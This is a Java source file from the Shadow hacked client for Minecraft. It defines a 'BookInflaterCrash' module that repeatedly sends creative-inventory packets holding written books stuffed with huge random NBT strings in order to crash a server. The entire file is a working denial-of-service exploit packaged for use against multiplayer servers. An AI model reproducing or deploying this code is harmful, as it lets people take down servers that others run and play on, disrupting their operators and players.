/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import org.apache.commons.lang3.RandomStringUtils;

public class BookInflaterCrash extends Module {
    int slot = 5;

    public BookInflaterCrash() {
        super("BookInflaterCrash", "Writes a book thats big", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        for (int i = 0; i < 5; i++) {
            if (slot > 36 + 9) {
                slot = 0;
                return;
            }
            slot++;
            ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
            NbtCompound tag = new NbtCompound();
            NbtList list = new NbtList();
            for (int j = 0; j < 99; j++) {
                list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
            }
            tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
            tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
            tag.put("pages", list);
            crash.setNbt(tag);
            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot, crash));
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
